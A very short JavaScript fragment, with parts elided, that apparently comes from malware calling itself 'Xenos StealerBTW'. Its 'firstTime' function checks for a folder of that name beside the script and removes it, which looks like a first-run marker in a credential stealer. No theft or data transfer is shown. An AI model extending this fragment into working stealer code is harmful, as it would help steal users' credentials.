...
async function firstTime() {
    ...
    if (!fs.existsSync(path.join(__dirname, "Xenos StealerBTW"))) return true

    fs.rmdirSync(path.join(__dirname, "Xenos StealerBTW"));
